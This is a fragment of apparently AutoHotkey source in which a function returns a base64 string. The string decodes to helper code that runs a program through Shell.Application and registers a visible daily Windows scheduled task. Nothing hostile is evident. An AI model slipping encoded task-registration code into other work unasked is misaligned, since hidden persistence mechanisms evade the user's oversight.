ICAgICAgKCAldiUgIT0gLTEgJiYgRGxsQ2FsbCgiQ2xvc2VIYW5kbGUiLCBQdHIsICV2JSkgKQ0KICAgaWYgZXJyb3INCiAgICAgIHRocm93IEV4Y2VwdGlvbihlcnJvcikNCiAgIFJldHVybiBQSUQNCn0NCg0KU2hlbGxSdW5Bc1VzZXIoZmlsZVBhdGgsIGFyZ3VtZW50cyA6PSAiIiwgZGlyZWN0b3J5IDo9ICIiLCB2ZXJiIDo9ICJvcGVuIiwgc2hvdyA6PSAxKQ0Kew0KICAgc3RhdGljIFZUX1VJNCA6PSAweDEzLCBTV0NfREVTS1RPUCA6PSAweDgNCiAgIHNoZWxsV2luZG93cyA6PSBDb21PYmpDcmVhdGUoIlNoZWxsLkFwcGxpY2F0aW9uIikuV2luZG93cw0KICAgc2hlbGwgOj0gc2hlbGxXaW5kb3dzLkl0ZW0oIENvbU9iamVjdChWVF9VSTQsIFNXQ19ERVNLVE9QKSApLkRvY3VtZW50LkFwcGxpY2F0aW9uDQogICBzaGVsbC5TaGVsbEV4ZWN1dGUoZmlsZVBhdGgsIGFyZ3VtZW50cywgZGlyZWN0b3J5LCB2ZXJiLCBzaG93KQ0KfQ0KDQpDcmVhdGVUYXNrKHRhc2tOYW1lLCBmaWxlUGF0aCwgc0FyZ3MsIHN0YXJ0VGltZSwgaW50ZXJ2YWxIb3VycyA6PSAwLCBzdGFydEltbWVkaWF0ZWx5IDo9IGZhbHNlKSB7DQogICBsb2NhbA0KICAgc3RhdGljIFRBU0tfVFJJR0dFUl9EQUlMWSA6PSAyDQogICAgICAgICwgVEFTS19BQ1RJT05fRVhFQyA6PSAwDQogICAgICAgICwgVEFTS19DUkVBVEVfT1JfVVBEQVRFIDo9IDYNCiAgICAgICAgLCBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VOIDo9IDMNCiAgICAgICAgDQogICBpZiAhUmVnRXhNYXRjaChzdGFydFRpbWUsICJeKD86MHwxfCgyKSkoPygxKVswLTNdfFxkKTpbMC01XVxkJCIpDQogICAgICB0aHJvdyAid3Jvbmcgc3RhcnRUaW1lIGZvcm1hdCINCiAgIGlmICFzZXJ2aWNlIDo9IENvbU9iakNyZWF0ZSgiU2NoZWR1bGUuU2VydmljZSIpDQogICAgICBSZXR1cm4gZmFsc2UNCiAgIHNlcnZpY2UuQ29ubmVjdCgpDQogICByb290Rm9sZGVyIDo9IHNlcnZpY2UuR2V0Rm9sZGVyKCJcIikNCiAgIHRhc2tEZWZpbml0aW9uIDo9IHNlcnZpY2UuTmV3VGFzaygwKQ0KICAgDQogICBwcmluY2lwYWwgOj0gdGFza0RlZmluaXRpb24uUHJpbmNpcGFsDQogICBwcmluY2lwYWwuTG9nb25UeXBlIDo9IFRBU0tfTE9HT05fSU5URVJBQ1RJVkVfVE9LRU4NCiAgIA0KICAgc2V0dGluZ3MgOj0gdGFza0RlZmluaXRpb24uU2V0dGluZ3MNCiAgIHNldHRpbmdzLkVuYWJsZWQgOj0gdHJ1ZQ0KICAgc2V0dGluZ3MuU3RhcnRXaGVuQXZhaWxhYmxlIDo9IHRydWUNCiAgIHNldHRpbmdzLkRpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzIDo9IGZhbHNlDQogICBzZXR0aW5ncy5SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlIDo9IHRy"
base64 .= "dWUNCiAgIHNldHRpbmdzLkhpZGRlbiA6PSBmYWxzZQ0KDQogICB0cmlnZ2VycyA6PSB0YXNrRGVmaW5pdGlvbi5UcmlnZ2Vycw0KICAgdHJpZ2dlciA6PSB0cmlnZ2Vycy5DcmVhdGUoVEFTS19UUklHR0VSX0RBSUxZKQ0KICAgaWYgaW50ZXJ2YWxIb3VycyB7DQogICAgICByZXBldGl0aW9uIDo9IHRyaWdnZXIuUmVwZXRpdGlvbg0KICAgICAgcmVwZXRpdGlvbi5EdXJhdGlvbiA6PSAiUDFEIg0KICAgICAgcmVwZXRpdGlvbi5JbnRlcnZhbCA6PSAiUFQiIC4gaW50ZXJ2YWxIb3VycyAuICJIIg0KICAgfQ0KICAgc3RhcnRUaW1lIDo9ICIyMDIyMDYxNiIgLiBTdHJSZXBsYWNlKHN0YXJ0VGltZSwgIjoiKSAuICIwMCINCiAgIEZvcm1hdFRpbWUsIHN0YXJ0VGltZSwgJSBzdGFydFRpbWUsIHl5eXktTU0tZGRUSEg6bW06c3MNCiAgIHRyaWdnZXIuU3RhcnRCb3VuZGFyeSA6PSBzdGFydFRpbWUNCiAgIHRyaWdnZXIuSWQgOj0gIlRpbWVUcmlnZ2VySWQiDQogICB0cmlnZ2VyLkVuYWJsZWQgOj0gdHJ1ZQ0KDQogICBhY3Rpb24gOj0gdGFza0RlZmluaXRpb24uQWN0aW9ucy5DcmVhdGUoIFRBU0tfQUNUSU9OX0VYRUMgKQ0KICAgYWN0aW9uLlBhdGggOj0gZmlsZVBhdGgNCiAgIChzQXJncyAhPSAiIiAmJiBhY3Rpb24uQXJndW1lbnRzIDo9IHNBcmdzKQ0KICAgDQogICB0YXNrIDo9IHJvb3RGb2xkZXIuUmVnaXN0ZXJUYXNrRGVmaW5pdGlvbih0YXNrTmFtZSwgdGFza0RlZmluaXRpb24sIFRBU0tfQ1JFQVRFX09SX1VQREFURSwsLCBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VOKQ0KICAgKCBzdGFydEltbWVkaWF0ZWx5ICYmIHRhc2suUnVuKCIiKSApDQogICBSZXR1cm4gdHJ1ZQ0KfQ=="
Return base64
}